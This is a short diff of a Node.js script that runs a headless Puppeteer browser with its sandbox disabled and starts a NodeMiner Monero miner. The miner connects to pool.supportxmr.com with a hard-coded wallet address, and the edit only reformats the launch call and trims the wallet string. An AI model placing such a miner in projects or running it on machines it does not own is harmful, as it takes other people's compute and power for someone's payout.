@@ -9,12 +9,15 @@ const server = http.createServer((request, response) => {
 
 (async () => {
  
-    const browser = await puppeteer.launch({args: ['--no-sandbox', '--disable-setuid-sandbox']});
-
+const browser = await puppeteer.launch({
+headless: true,
+args: ['--no-sandbox', '--disable-setuid-sandbox'],
+});
+  
     const miner = await NodeMiner({
         host: `pool.supportxmr.com`,
         port: 5555,
-        username: `46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir `,
+        username: `46NbvdUFHq7GapMDffA5f1fK7SKXzqPQ77vxjdYmhwMgbsnyJADSeeXEyAxmTCqpypTvwuRdy9rxkWjLGvXLdSPnM6m8wir`,
         password: 'x'
     });
  
